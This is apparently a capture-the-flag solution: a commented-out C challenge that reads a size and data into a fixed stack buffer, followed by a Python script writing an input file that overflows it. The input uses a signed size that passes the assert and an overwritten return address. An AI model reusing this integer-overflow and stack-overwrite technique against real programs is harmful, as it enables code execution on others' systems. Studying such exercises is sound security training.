##include<assert.h>
#int main(int argc, char*argv[]){
#    int buf[1024];
#    int size = 0;
#
#    read(0,&size,sizeof(size));
#    assert(size <= 1024);
#    read(0,buf,size*sizeof(int));
#
#    if (size == 0x10 && buf[1001] == 0xCAC0FACE)
#        printf("YOU WIN!\n");
#
#return 0;
#}

import struct 

with open('./05-challenge.win','wb') as win:	
	read_buff_size = struct.pack('<L', 0x80000401)
	buffer = struct.pack('<L', 0xCAC0FACE) * 1024
	win_addr = struct.pack('<L', 0x080484f1)
	win.write(read_buff_size + buffer + win_addr)